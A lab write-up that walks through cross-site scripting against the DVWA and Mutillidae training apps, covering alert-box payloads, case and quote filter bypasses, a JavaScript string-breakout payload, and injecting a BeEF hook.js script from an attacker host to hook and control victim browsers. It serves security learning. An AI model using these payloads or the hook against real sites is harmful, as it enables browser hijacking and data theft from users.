Cross-Site Scripting (XSS)

In this section, we begin exploring Cross-Site Scripting (XSS), one of the most common web application vulnerabilities. Unlike SQL Injection, which targets the database or server, XSS targets the users of the application by injecting malicious JavaScript into web pages.

 What is Cross-Site Scripting (XSS)?

Cross-Site Scripting (XSS) is a vulnerability that allows an attacker to inject JavaScript code into a web page. When another user visits the affected page, the injected JavaScript is executed by their web browser.

Unlike server-side vulnerabilities, JavaScript is a client-side scripting language, meaning the code runs on the victim's browser, not on the web server.

As a result:

 The web server simply delivers the page containing the malicious JavaScript.
 The victim's browser executes the JavaScript automatically.
 Any actions performed by the script happen in the victim's browser under their current session.

> Important: Even if the injected JavaScript attempts to establish a reverse shell or perform other actions, those actions execute from the victim's computer, not from the web server.

---

 Types of Cross-Site Scripting (XSS)

There are three main types of XSS vulnerabilities:

 1. Stored (Persistent) XSS

Stored XSS occurs when the malicious JavaScript is permanently stored by the web application, usually inside a database.

Examples include:

 Comment sections
 Guestbooks
 Forums
 User profiles
 Message boards

When any user visits the affected page, the stored JavaScript is automatically executed in their browser.

Characteristics:

 Payload is stored on the server.
 Executes every time the vulnerable page is viewed.
 Can affect multiple users.

---

 2. Reflected XSS

Reflected XSS occurs when the malicious script is included in a specially crafted URL or request.

The payload is not stored on the server.

Instead:

1. The attacker creates a malicious URL.
2. The victim is persuaded to click the link.
3. The application reflects the input back into the webpage.
4. The browser executes the injected JavaScript.

Characteristics:

 Not stored in the database.
 Requires user interaction.
 Commonly delivered through phishing emails or malicious links.

---

 3. DOM-Based XSS

DOM-Based XSS occurs entirely inside the user's browser.

Instead of the web server processing the malicious input, JavaScript running in the browser updates the page using data from sources such as:

 URL parameters
 URL fragments (``)
 Client-side JavaScript variables

Since the payload never reaches the server, traditional server-side filtering may not detect it.

This type of XSS commonly appears in modern websites that dynamically update content without refreshing the page.

Examples include:

 Live search suggestions
 Dynamic page updates
 Single Page Applications (SPAs)
 Client-side rendering using JavaScript

Characteristics:

 Executes entirely in the browser.
 No communication with the server is required after the page loads.
 Can bypass server-side validation because the payload is never processed by the server.

---

 Client-Side Execution

Unlike SQL Injection, which executes SQL queries on the database server, XSS executes JavaScript on the victim's browser.

The flow is:

1. An attacker injects JavaScript into a vulnerable web application.
2. The web application serves the page to users.
3. A victim opens the page.
4. The victim's browser executes the JavaScript.
5. The attacker can perform actions within the victim's browser session.

---
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@


 Discovering Reflected Cross-Site Scripting (XSS)

In this exercise, we tested a web application for a Reflected Cross-Site Scripting (XSS) vulnerability. Similar to SQL Injection testing, we inspected user input fields and URL parameters to determine whether user-supplied data could be executed as JavaScript.

 Identifying Potential Injection Points

During reconnaissance, we looked for locations where user input is reflected back to the browser, such as:

 Text input fields
 Search boxes
 Login forms
 URL parameters (GET requests)

For example, the application accepts a parameter similar to:

```text
http://<target>/vulnerabilities/xss_r/?name=Adil
```

Since the application reflects the value of the name parameter back to the webpage, it becomes a potential XSS injection point.

---

 Testing the Input Field

We navigated to:

DVWA → XSS (Reflected)

The page contains a text field asking for a user's name.

Instead of entering normal text, we supplied the following JavaScript payload:

```html
<script>alert('XSS')</script>
```

After clicking Submit, the browser immediately displayed an alert dialog containing XSS.

This confirms that the application executed our JavaScript instead of treating it as plain text.

<img width="1440" height="745" alt="Screenshot 2026-07-14 at 9 04 48 PM" src="https://github.com/user-attachments/assets/8a087129-aceb-4c83-9d61-005d39d3d49b" />



---

 Testing Through the URL

Since the application uses the GET method, the input also appears in the URL.

The URL becomes similar to:

```text
http://<target>/vulnerabilities/xss_r/?name=<script>alert('XSS')</script>
```

When this URL is opened, the browser executes the injected JavaScript automatically and displays the alert box.

This demonstrates that the payload can be delivered through a specially crafted URL.

<img width="1438" height="728" alt="Screenshot 2026-07-14 at 9 06 01 PM" src="https://github.com/user-attachments/assets/3835288e-8f82-4602-af9b-526430384c7d" />

<img width="1440" height="818" alt="Screenshot 2026-07-14 at 9 05 50 PM" src="https://github.com/user-attachments/assets/2079d49b-5d15-400e-ae35-851d70a70d98" />


---

 Reflected XSS Attack Scenario

Unlike Stored XSS, the payload is not saved by the application.

Instead:

1. The attacker creates a URL containing the malicious JavaScript.
2. The attacker sends the URL to a victim (for example, through email or instant messaging).
3. The victim opens the link.
4. The web application reflects the input back into the page.
5. The victim's browser executes the injected JavaScript.

Because the payload is reflected from the request and not stored on the server, this is classified as Reflected XSS.

---

 Key Takeaways

 Reflected XSS occurs when user input is immediately returned by the application without proper sanitization.
 Both text input fields and URL parameters should be tested for XSS vulnerabilities.
 A simple payload such as:

```html
<script>alert('XSS')</script>
```

can be used to verify whether JavaScript execution is possible.

 If the browser executes the script, the application is vulnerable to Reflected XSS.
 Unlike Stored XSS, the payload is not stored on the server and only executes when a victim opens the malicious URL.
 In a real attack, an attacker would typically send the crafted URL to a victim through phishing or another social engineering technique, causing the victim's browser to execute the malicious JavaScript.

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@


 Reflected XSS – Medium Security (DVWA)

In this exercise, we tested the Reflected XSS vulnerability in DVWA after increasing the security level from Low to Medium. The objective was to determine how the application's input filtering affected our previously successful XSS payload.

---

 Changing the Security Level

First, we navigated to:

DVWA → DVWA Security

and changed the security level from Low to Medium.

After saving the changes, we returned to:

DVWA → XSS (Reflected)


---

 Testing the Previous Payload

We first tested the same payload that successfully executed at the Low security level:

```html
<script>alert('XSS')</script>
```

Instead of displaying the JavaScript alert, the application simply displayed the text:

```text
alert('XSS')
```

No JavaScript was executed.

<img width="1433" height="814" alt="Screenshot 2026-07-14 at 9 17 12 PM" src="https://github.com/user-attachments/assets/fd05e399-057d-4f3d-8386-e681680eae00" />

<img width="1435" height="801" alt="Screenshot 2026-07-14 at 9 26 18 PM" src="https://github.com/user-attachments/assets/0cd11db4-8e4a-43e2-b919-c46586c01775" />

---

 Inspecting the Source Code

To understand why the payload failed, we right-clicked the page and selected Inspect.

Looking at the HTML source, we observed that the application had removed the `<script>` and `</script>` tags before rendering the page.

Instead of:

```html
Hello <script>alert('XSS')</script>
```

the page contained only:

```html
Hello alert('XSS')
```

Since the JavaScript was no longer enclosed within `<script>` tags, the browser treated it as plain text instead of executable code.

This indicated that the application was filtering the word script from the user input.



---

 Bypassing the Filter

The filtering mechanism only removed the exact lowercase word script.

To test whether the filter was case-sensitive, we modified the payload by changing the capitalization of the tag.

Payload used:

```html
<ScRiPt>alert('XSS')</ScRiPt>
```

After submitting the modified payload, the alert box appeared successfully.

This confirmed that the application's filter was case-sensitive, allowing us to bypass it by changing the capitalization of the tag.

<img width="1435" height="747" alt="Screenshot 2026-07-14 at 9 18 52 PM" src="https://github.com/user-attachments/assets/8407b1d8-efaf-4975-8ed8-267b306f76cc" />


<img width="1440" height="741" alt="Screenshot 2026-07-14 at 9 19 03 PM" src="https://github.com/user-attachments/assets/28be4c5a-e74e-4cb4-b5e2-ecde46217ae4" />


---

 Alternative XSS Payloads

Simple keyword filtering is often insufficient to prevent Cross-Site Scripting. JavaScript can be executed through many different HTML elements and event handlers.

Some examples include:

Using an image error event:

```html
<img src="invalid-image" onerror="alert('XSS')">
```

Using a mouse-over event:

```html
<a href="" onmouseover="alert('XSS')">Hover over me</a>
```

These alternative payloads demonstrate that blocking only the `<script>` tag does not eliminate XSS vulnerabilities.


---

 Key Takeaways

 At Medium security, the original payload:

```html
<script>alert('XSS')</script>
```

was blocked because the application removed the `<script>` tags.

 Inspecting the page source confirmed that the filtering occurred before the page was rendered.

 The filter was case-sensitive, allowing the payload to bypass the protection by using mixed-case tags:

```html
<ScRiPt>alert('XSS')</ScRiPt>
```

 Filtering only specific keywords such as script is not an effective defense against XSS.

 JavaScript can also execute through other HTML elements and event handlers, making proper input validation and output encoding essential for preventing Cross-Site Scripting vulnerabilities.

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

 JavaScript Injection (XSS) – Understanding the Context

In this exercise, we examined another example of Cross-Site Scripting (XSS) to understand that XSS payloads often need to be adapted based on how a web application handles user input. Unlike previous examples where we injected an entire `<script>` tag, this application already placed user input inside an existing JavaScript block.

---

 Navigating to the Vulnerable Page

We logged into OWASP Mutillidae II and navigated to:

OWASP 2013 → JavaScript Injection → Password Generator

<img width="1440" height="817" alt="Screenshot 2026-07-14 at 9 36 28 PM" src="https://github.com/user-attachments/assets/74d80db4-9a8b-439a-8119-6badf9d8fdf1" />


The page generates a random password for the username supplied through the URL.

For example:

```text
http://<target>/mutillidae/index.php?page=password-generator.php&username=anonymous
```

Changing the username parameter immediately changes the text displayed on the page.

For example:

```text
username=Adil
```

The page displays:

```text
This password is for Adil
```

Since the username is reflected back into the page, this indicates a possible XSS injection point.

<img width="1440" height="819" alt="Screenshot 2026-07-14 at 9 36 49 PM" src="https://github.com/user-attachments/assets/80903abb-0863-4f0d-9e65-036922d90c7f" />

<img width="1440" height="859" alt="Screenshot 2026-07-14 at 9 37 15 PM" src="https://github.com/user-attachments/assets/0683a41b-be23-4eaf-86c6-bf61c69b456c" />

---

 Testing a Standard XSS Payload

We first tested the same payload used in previous exercises:

```html
<script>alert('XSS')</script>
```

Unlike the earlier reflected XSS example, no alert box appeared.

However, the webpage displayed broken output, indicating that our input had affected the page's JavaScript.


---

 Inspecting the Source Code

To understand why the payload failed, we inspected the page source using Inspect Element.

The source code revealed that our input was already being inserted inside an existing JavaScript statement similar to:

```javascript
document.getElementById("output").innerHTML = "This password is for 'USER_INPUT'";
```

Our payload was inserted directly between the quotation marks.

Because the application already surrounded our input with JavaScript code, adding another `<script>` tag broke the script instead of executing it.

<img width="1440" height="817" alt="Screenshot 2026-07-14 at 9 37 53 PM" src="https://github.com/user-attachments/assets/a585c496-d4a5-4b8d-bdfe-98fbd17b15e6" />

---

 Crafting a New Payload

Since the application already places our input inside a JavaScript string, we no longer need to inject `<script>` tags.

Instead, we:

1. Closed the existing quotation mark.
2. Terminated the current JavaScript statement with a semicolon.
3. Executed our own JavaScript.
4. Commented out the remaining original code.

Payload used:

```javascript
';alert('XSS');//
```

This payload works as follows:

 `'` closes the original string.
 `;` ends the original JavaScript statement.
 `alert('XSS');` executes our own JavaScript.
 `//` comments out the remaining code so the original script does not generate a syntax error.

---

 Executing the Payload

We entered the payload into the username parameter:

```javascript
';alert('XSS');//
```

After clicking Generate Password, the browser displayed the JavaScript alert.

This confirms that our injected JavaScript was successfully executed.

<img width="1432" height="862" alt="Screenshot 2026-07-14 at 9 43 06 PM" src="https://github.com/user-attachments/assets/96c5baf6-2f85-4559-a66e-4681a29c3a57" />


---

 Understanding Why the Payload Works

Originally, the application generated JavaScript similar to:

```javascript
document.getElementById("output").innerHTML = "This password is for USER_INPUT";
```

After injecting our payload, the JavaScript became:

```javascript
document.getElementById("output").innerHTML = "This password is for ";
alert('XSS');
//";
```

The browser executes the `alert('XSS')` statement, while the remainder of the original line is ignored because it has been commented out.

---

 Key Takeaways

 XSS payloads often need to be adapted depending on how user input is inserted into the page.
 Not every application requires injecting an entire `<script>` tag.
 Inspecting the page source helps determine whether the input is reflected inside:

   HTML
   JavaScript
   HTML attributes
   Existing JavaScript strings
 In this example, the application already embedded user input inside JavaScript, so we injected JavaScript directly instead of creating a new `<script>` block.
 The payload used in this exercise was:

```javascript
';alert('XSS');//
```

 This technique demonstrates why understanding the application's source code is essential when testing for Cross-Site Scripting vulnerabilities.


@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

 Stored Cross-Site Scripting (Stored XSS)

In this exercise, we tested a Stored Cross-Site Scripting (Stored XSS) vulnerability in DVWA. Unlike Reflected XSS, where the victim must open a specially crafted URL, a Stored XSS payload is saved by the application (typically in a database). Every user who visits the affected page automatically executes the injected JavaScript.

---

 Navigating to the Vulnerable Page

We logged into DVWA and navigated to:

DVWA → XSS (Stored) Make sure that the security is set to low on both machines 

The page contains a guestbook where users can submit:

 Name
 Message

Initially, we entered normal values to observe the application's behavior.

Example:

Name

```text
Adil
```

Message

```text
Hello everyone!
```

After clicking Sign Guestbook, the message was successfully added to the guestbook.

<img width="1282" height="714" alt="Screenshot 2026-07-14 at 9 50 29 PM" src="https://github.com/user-attachments/assets/8bbe92f3-acb9-4815-a717-0ec345c7d5f4" />


---

 Testing for Stored XSS

Next, we attempted to inject JavaScript into the Message field.

Name

```text
Adil
```

Message

```html
<script>alert('XSS')</script>
```

We then clicked Sign Guestbook.

Immediately after submitting the message, the browser displayed an alert box, confirming that our JavaScript had been executed.

<img width="1431" height="800" alt="Screenshot 2026-07-14 at 9 51 34 PM" src="https://github.com/user-attachments/assets/822a4e33-9e06-48be-bf1f-280d97ab2bfe" />


<img width="1437" height="809" alt="Screenshot 2026-07-14 at 9 52 25 PM" src="https://github.com/user-attachments/assets/2606af98-6880-41f3-8ea3-96d963ec80cf" />

---

 Verifying the Stored Payload

To demonstrate that the payload had been permanently stored, we opened the guestbook from another browser session (or another machine).

When the guestbook page loaded, the alert box appeared automatically without requiring any additional interaction.

This confirmed that:

 The payload had been stored in the application's database.
 Every visitor viewing the guestbook executed the injected JavaScript automatically.

<img width="1402" height="831" alt="Screenshot 2026-07-14 at 9 50 52 PM" src="https://github.com/user-attachments/assets/ab892667-c589-4a1d-8446-86ef9e45edf1" />


<img width="1435" height="460" alt="Screenshot 2026-07-14 at 9 52 44 PM" src="https://github.com/user-attachments/assets/2e498306-6eab-46d2-afa9-72548a963d63" />


---

 Understanding Stored XSS

Unlike Reflected XSS, Stored XSS does not require the attacker to send a malicious link.

The attack flow is:

1. The attacker submits malicious JavaScript to a vulnerable page.
2. The application stores the payload in its database.
3. Another user visits the affected page.
4. The application retrieves the stored content.
5. The victim's browser executes the JavaScript automatically.

Because the payload is permanently stored until removed, Stored XSS is generally considered more dangerous than Reflected XSS.

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

 Exercise: Exploiting Stored Cross-Site Scripting (XSS) – Medium Security (DVWA)

 Objective

In this exercise, we tested whether Stored Cross-Site Scripting (XSS) could still be exploited when DVWA is configured to Medium security. We also demonstrated two different payloads, including one that bypasses quote filtering by using JavaScript character codes.

---

 Step 1: Reset the Database

Since Stored XSS saves malicious input into the database, we first cleared all previous entries.

 Log in to DVWA
 Navigate to Setup
 Click Reset Database

This removes all stored guestbook entries so we can begin with a clean environment.


---

 Step 2: Change Security Level

Navigate to:

DVWA Security → Medium → Submit

This enables the Medium security protections before testing Stored XSS.


---

 Step 3: Open the Stored XSS Page

Navigate to:

DVWA → XSS (Stored)

At Medium security, notice that:

 The Message field is filtered.
 The Name field is limited to 10 characters.

Since our payload is longer than 10 characters, we first bypass the client-side restriction.

---

 Step 4: Remove the Character Limit

1. Right-click inside the Name field.
2. Select Inspect.
3. Locate:

```html
maxlength="10"
```

4. Change it to:

```html
maxlength="100"
```

This only modifies the browser locally and allows us to enter a longer payload.



---

 Step 5: Inject the First Payload

Enter the following payload into the Name field:

```html
<ScRiPt>alert('XSS')</ScRiPt>
```

Enter any text in the Message field and click Sign Guestbook.

The mixed capitalization (`ScRiPt`) bypasses the simple blacklist filter used by the application.

<img width="1434" height="842" alt="Screenshot 2026-07-14 at 10 02 42 PM" src="https://github.com/user-attachments/assets/e082cbe7-d1af-48f0-ba9b-26886e8fe845" />


---

 Step 6: Verify the Stored XSS

Refresh the page or revisit the Stored XSS page.

The browser executes the stored JavaScript automatically, displaying the alert box.


---

 Bypassing Quote Filters Using Character Codes

Some applications filter or remove quotation marks (`'` or `"`), causing normal payloads to fail.

Instead of writing the string directly, JavaScript can recreate it using character codes.

---

 Step 7: Generate Character Codes

Convert the text:

```
XSS2
```

into JavaScript character codes.

Example:

```
88,83,83,50
```
<img width="1436" height="826" alt="Screenshot 2026-07-14 at 10 14 27 PM" src="https://github.com/user-attachments/assets/ee417a82-4c9a-43d1-a06b-277419db1334" />

---

 Step 8: Inject the Second Payload

Submit the following payload in the Name field:

```html
<ScRiPt>alert(String.fromCharCode(88,83,83,50))</ScRiPt>
```

After increasing the `maxlength` value again, submit the payload.


---

 Step 9: Observe the Result

When the Stored XSS page loads, JavaScript reconstructs the string using:

```javascript
String.fromCharCode(88,83,83,50)
```

The alert displays:

```
XSS2
```

without using quotation marks inside the payload.

<img width="1440" height="543" alt="Screenshot 2026-07-14 at 10 05 44 PM" src="https://github.com/user-attachments/assets/4ea08e37-f4ff-46ac-93cb-4c970919d1ad" />


<img width="1440" height="821" alt="Screenshot 2026-07-14 at 10 15 11 PM" src="https://github.com/user-attachments/assets/7c8ffdee-a3c1-41fa-83aa-623cba99140c" />


---

 Key Takeaways

 Stored XSS saves malicious JavaScript inside the application's database.
 Every visitor who loads the affected page automatically executes the stored script.
 Client-side restrictions such as `maxlength` can be bypassed using browser developer tools.
 Mixed capitalization (e.g., `<ScRiPt>`) may bypass simple blacklist-based filters.
 `String.fromCharCode()` can reconstruct strings without using quotation marks, helping bypass quote-filtering mechanisms.
 Stored XSS is generally more dangerous than Reflected XSS because the payload remains on the server until it is removed.


@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

 Exercise: Hooking a Browser Using Stored and Reflected XSS with BeEF (DVWA)

 Objective

In this exercise, we demonstrated how a Cross-Site Scripting (XSS) vulnerability can be used to hook a victim's browser into the Browser Exploitation Framework (BeEF). Rather than executing a simple `alert()` message, we injected the BeEF hook script into vulnerable pages so that any browser executing the payload becomes connected to the BeEF server.

> Note: This exercise was performed in a controlled lab environment using DVWA for educational purposes.

---

 Step 1: Start the BeEF Framework

On the Kali Linux machine, launch the BeEF Framework.

```bash
beef-xss
```

Once BeEF starts, open the web interface and log in using the default credentials.

Username

```text
beef
```

Password

```text
beef
```

After logging in, the BeEF dashboard opens. Initially, no browsers are connected.

<img width="1286" height="785" alt="Screenshot 2026-08-05 at 6 59 52 PM" src="https://github.com/user-attachments/assets/24610938-f20c-4c15-93da-8b32cc261286" />


---

 Step 2: Obtain the BeEF Hook Script

BeEF provides a JavaScript hook that must execute inside the victim's browser.

Example hook:

```html
<script src="http://172.16.219.133:3000/hook.js"></script>
```

> Replace the IP address with your own Kali Linux IP address.

To identify your IP address, run:

```bash
ifconfig
```

Example output:

```text
172.16.219.133
```

The hook script becomes:

```html
<script src="http://172.16.219.133:3000/hook.js"></script>
```


---

 Part 1 – Reflected XSS

 Step 3: Open the Reflected XSS Page

Navigate to:

DVWA → XSS (Reflected)

Set the security level to Low.

Instead of the normal alert payload:

```html
<script>alert('XSS')</script>
```

inject the BeEF hook:

```html
<script src="http://172.16.219.133:3000/hook.js"></script>
```

The URL now contains the injected JavaScript.



---

 Step 4: Execute the Payload

When the vulnerable URL is opened, the browser loads the BeEF hook.

Returning to the BeEF dashboard, the browser now appears under Online Browsers.



---

 Part 2 – Stored XSS

Stored XSS is more dangerous because the payload is permanently saved in the application. Any user who visits the vulnerable page automatically executes the JavaScript.

---

 Step 5: Open the Stored XSS Page

Navigate to:

DVWA → XSS (Stored)

The Name field limits input length, so increase the maximum length using the browser's Developer Tools.

Right-click the Name field → Inspect.

Change:

```html
maxlength="10"
```

to

```html
maxlength="500"
```

<img width="1440" height="889" alt="Screenshot 2026-08-05 at 7 11 10 PM" src="https://github.com/user-attachments/assets/e60b47cf-0a22-4a6e-be7f-c800cf27f3c6" />


---

 Step 6: Inject the BeEF Hook

Enter the following payload:

```html
<script src="http://172.16.219.133:3000/hook.js"></script>
```

Click Sign Guestbook.

The payload is now stored inside the application's database.


---

 Step 7: Simulate a Victim Visiting the Page

On another machine (Windows in our lab), open DVWA and navigate to:

XSS (Stored)

No suspicious URL or interaction is required. Simply loading the page causes the browser to execute the stored JavaScript.


---

 Step 8: Verify the Browser is Hooked

Return to the BeEF dashboard.

The Windows browser now appears under Online Browsers, confirming that the JavaScript hook executed successfully.

The BeEF console also displays information such as:

 Browser type
 Operating system
 IP address
 Online status

<img width="1440" height="848" alt="Screenshot 2026-08-05 at 7 11 57 PM" src="https://github.com/user-attachments/assets/85ca1137-c45a-4c2f-bef1-ba0755abff7c" />


---

 Key Takeaways

 BeEF uses a small JavaScript hook to establish communication with a victim's browser.
 Reflected XSS requires the victim to open a specially crafted URL containing the payload.
 Stored XSS is more dangerous because the payload remains stored on the server and executes automatically whenever users visit the vulnerable page.
 After a browser is hooked, BeEF can interact with the browser through its available modules, depending on browser capabilities and security settings.
 Trusted or high-traffic websites with Stored XSS vulnerabilities present a greater risk because many users may unknowingly execute the malicious JavaScript.

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

 Exercise: Interacting With a Hooked Browser Using BeEF

 Objective

In this exercise, we explored the BeEF command interface after successfully hooking a browser. We examined the information BeEF collects about the hooked browser and tested several basic modules in our isolated DVWA lab.

---

 Step 1: Select the Hooked Browser

After the Windows browser is successfully hooked, it appears under:

Online Browsers → Hooked Browser

Click the target IP address.

The right-hand panel now provides information and commands for the selected browser.

<img width="1426" height="740" alt="Screenshot 2026-08-06 at 5 12 10 PM" src="https://github.com/user-attachments/assets/dfca286b-111d-45e5-a51e-a3135991cb98" />

---

 Step 2: Examine Browser Information

The Details section provides information about the hooked browser.

We can observe information such as:

 Browser type and version
 Browser engine
 Language
 Browser architecture
 Installed plugins
 Enabled browser components

The browser architecture and operating-system architecture may be different.

For example:

```text
Browser architecture: 32-bit
Operating system architecture: 64-bit
```

<img width="1432" height="768" alt="Screenshot 2026-08-06 at 5 12 23 PM" src="https://github.com/user-attachments/assets/ef15e9c3-e61d-44b0-b91d-905e969adec1" />


---

 Step 3: Examine the Target Information

Scrolling through the information reveals additional details about the hooked session.

We can observe:

 Current page
 Referrer page
 Target IP address
 Operating system
 System architecture
 Available browser information

In our lab, the target is the Windows machine running the hooked browser.



---

 Step 4: Examine the Logs

The Logs section records events associated with the hooked browser.

For example, we can see events such as:

```text
Browser joined
Browser window focused
Browser window lost focus
```

These logs help us understand what has happened during the current hooked session.



---

 Step 5: Explore the Available Modules

The Commands section contains the modules that can be executed against the hooked browser.

The modules are organized into different categories, including:

 Browser
 Exploits
 Social Engineering
 Network
 Other browser-related functionality

You can also use the search box to find a specific module.

<img width="1438" height="780" alt="Screenshot 2026-08-06 at 5 12 35 PM" src="https://github.com/user-attachments/assets/4272c4b2-fdd7-46a3-8481-2c5bf9a7cd3f" />


---

 Step 6: Browser Command – Alert Dialog

For our first basic test, search for:

```text
Alert Dialog
```

Select the BeEF alert-dialog module.

Enter:

```text
test
```

Then click:

Execute

The hooked browser displays the message.

<img width="1438" height="775" alt="Screenshot 2026-08-06 at 5 14 40 PM" src="https://github.com/user-attachments/assets/22dc19cc-6d38-46c8-b7b8-f500e4ce5cb0" />

<img width="1438" height="668" alt="Screenshot 2026-08-06 at 5 14 57 PM" src="https://github.com/user-attachments/assets/a06512f7-2fa3-4619-af36-7a40617d6c19" />

 Result

This confirms that BeEF can execute JavaScript functionality within the hooked browser.

---

 Step 7: Raw JavaScript

Another module available in BeEF is:

Raw JavaScript

This module allows JavaScript to be executed within the context of the hooked page.

For our safe proof-of-concept, use:

```javascript
alert("BeEF Raw JavaScript");
```

Click Execute.

The message appears inside the hooked browser.

<img width="1433" height="826" alt="Screenshot 2026-08-06 at 5 15 41 PM" src="https://github.com/user-attachments/assets/940fb42e-0660-4754-b010-d85e06cc685e" />


<img width="1440" height="532" alt="Screenshot 2026-08-06 at 5 15 52 PM" src="https://github.com/user-attachments/assets/d583a8e4-27af-4c21-a9ae-e44385f78d19" />

 Result

The test demonstrates that arbitrary JavaScript supplied to the module can execute within the browser context.

---

 Step 8: Screenshot Module

Next, we tested the browser screenshot functionality available in BeEF.

Search for the screenshot-related module and execute it against the hooked browser.

After execution, BeEF can return an image representing the browser's current view, subject to browser and environment limitations.

<img width="1427" height="795" alt="Screenshot 2026-08-06 at 5 16 10 PM" src="https://github.com/user-attachments/assets/75f28b38-7222-483e-a5bc-fc63fd60dd30" />


 Result

The screenshot demonstrates that browser-level information can sometimes be collected from a hooked session.

> Important lab observation: this captures the hooked browser/page context, not necessarily the entire Windows desktop or other applications/tabs.

---

 Step 9: Redirect Module

BeEF also provides a Redirect Browser module.

For this exercise, use a harmless destination such as the BeEF project website.

Enter the destination and click:

<img width="1437" height="762" alt="Screenshot 2026-08-06 at 5 17 51 PM" src="https://github.com/user-attachments/assets/410bb2d2-3b86-407b-bd52-288df41b75cc" />


Execute

The hooked browser is redirected to the specified page.

<img width="1436" height="892" alt="Screenshot 2026-08-06 at 5 17 40 PM" src="https://github.com/user-attachments/assets/40081b27-2098-4ef7-82b4-0cb754419d65" />


 Result

The browser successfully navigates away from the original page.

---

 Step 10: Network Visualization

The Network section provides a visual representation of the hooked browser and its relationship to the BeEF server.

In a larger lab containing multiple hooked browsers, this section can help visualize the connected clients.

<img width="1440" height="744" alt="Screenshot 2026-08-06 at 5 12 46 PM" src="https://github.com/user-attachments/assets/865d3d9f-b22f-428d-94d6-e7cf77b9c5db" />


---

 BeEF Interface Overview

| Section                | Purpose                                          |
| ---------------------- | ------------------------------------------------ |
| Details            | Browser and target information                   |
| Logs               | Events generated during the session              |
| Commands           | Modules available for the hooked browser         |
| Rider              | HTTP request-related functionality               |
| Network            | Visualization of connected browsers              |
| WebRTC             | Browser-to-browser/network-related functionality |
| Exploits           | Tests for browser/application vulnerabilities    |
| Social Engineering | Controlled demonstrations involving browser UI   |

---

 Key Takeaways

 A hooked browser appears under Online Browsers in BeEF.
 Selecting the browser exposes information and available modules.
 Browser details can reveal information such as browser version, language, architecture, and operating system.
 The Commands section is where browser-level modules are executed.
 Alert Dialog provides a simple proof that JavaScript execution is working.
 Raw JavaScript allows controlled JavaScript testing.
 The screenshot module demonstrates browser-view capture capabilities.
 The redirect module demonstrates browser navigation control.
 BeEF's capabilities depend heavily on the browser, permissions, security controls, and the specific module being used.
 All testing should remain inside the authorized DVWA/Windows lab environment.

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
